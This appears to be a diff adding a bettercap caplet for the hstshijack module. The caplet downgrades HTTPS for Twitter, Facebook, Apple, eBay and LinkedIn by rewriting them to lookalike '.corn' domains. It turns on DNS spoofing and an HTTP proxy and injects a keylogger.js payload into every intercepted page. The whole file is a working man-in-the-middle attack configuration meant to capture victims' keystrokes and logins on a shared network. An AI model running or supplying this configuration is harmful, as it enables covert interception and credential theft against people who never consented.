@@ -1,0 +1,14 @@
+set hstshijack.log             /usr/share/bettercap/caplets/hstshijack/ssl.log
+set hstshijack.ignore          *
+set hstshijack.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,apple.com,*.apple.com,ebay.com,*.ebay.com,www.linkedin.com
+set hstshijack.replacements    twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,linkedin.com
+set hstshijack.obfuscate       false
+set hstshijack.encode          false
+set hstshijack.payloads        *:/usr/share/bettercap/caplets/hstshijack/payloads/keylogger.js
+
+
+set http.proxy.script  /usr/share/bettercap/caplets/hstshijack/hstshijack.js
+set dns.spoof.domains  twitter.corn,*.twitter.corn,facebook.corn,*.facebook.corn,apple.corn,*.apple.corn,ebay.corn,*.ebay.corn,linkedin.com
+
+http.proxy  on
+dns.spoof   on
